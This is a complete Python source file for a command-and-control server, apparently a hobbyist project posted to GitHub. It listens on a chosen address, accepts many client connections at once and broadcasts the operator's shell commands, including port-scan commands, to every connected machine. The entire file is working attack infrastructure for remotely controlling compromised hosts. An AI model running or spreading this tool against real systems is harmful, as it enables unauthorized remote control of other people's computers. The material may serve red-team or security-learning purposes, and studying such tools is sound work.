# ==================================================================================================================== #
# Version 1.3.0 of my C2 Server!                                                                                       #
# Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
# ==================================================================================================================== #

import socket
import sys
import threading
import argparse


def start(cmdaddress):
    s.listen()
    print(f"Server is listening on: {cmdaddress}")
    while True:
        connection, address = s.accept()
        thread = threading.Thread(target=handle_clients, args=(connection, address))
        thread.start()
        thread_list.append(thread)
        listen_thread = threading.Thread(target=receive_info, args=(connection, address))
        listen_thread.start()
        thread_recv_list.append(listen_thread)
        print(f"Active connections: {threading.active_count() - 2}")
        print("Type 'help' for a list of commands")


def receive_info(connection, address):
    try: # Figure out how to make this not throw errors when "stopall" is entered without using try and except
        while True:
            for everythread in thread_list:
                client_connected_info = connection.recv(1024).decode("utf-8")
                print(client_connected_info)
    except:
        pass


def handle_clients(connection, address):
    try:
        print(f"Client {address} connected")
        sending()
        print("Stopping connections")
        for thread in thread_list:
            connection = thread._args[0]
            connection.close()
            thread_list.remove(threading.current_thread())   
        print("All connections disconnected. Keep terminal open to continue listening. Close terminal to exit.")
    except KeyboardInterrupt:
        sys.exit()


def sending():
    command = ''
    while command != "stopall":
        command = input(">> ")
        if command == "help":
            print("""
            Custom commands: 'portscan' 'openports'
            Can also run normal windows/linux commands
            Use 'stopall' to disconnect clients
            """)
            continue
        else:
            broadcast(command)


def broadcast(command):
    command = command.encode("utf-8")
    for thread in thread_list:
        connection = thread._args[0]
        connection.send(command)


# Run checks with argparse #
ap = argparse.ArgumentParser(description=f"Example: {sys.argv[0]} 127.0.0.1 4444")
ap.add_argument("listenip", help="Enter IP address to listen on", type=str)
ap.add_argument("listenport", help="Enter port to listen on", type=int)
parseargs = ap.parse_args()
cmdserver_ip = parseargs.listenip
cmdserver_port = parseargs.listenport

# Final check #
cmdaddress = (cmdserver_ip,cmdserver_port)
s = socket.socket()
try:
    s.bind(cmdaddress)
except socket.gaierror:
    print("Invalid address or port given")
    sys.exit()
# ------------------------------------#

thread_list = []
thread_recv_list = []

# Once checks are done, start connection
start(cmdaddress)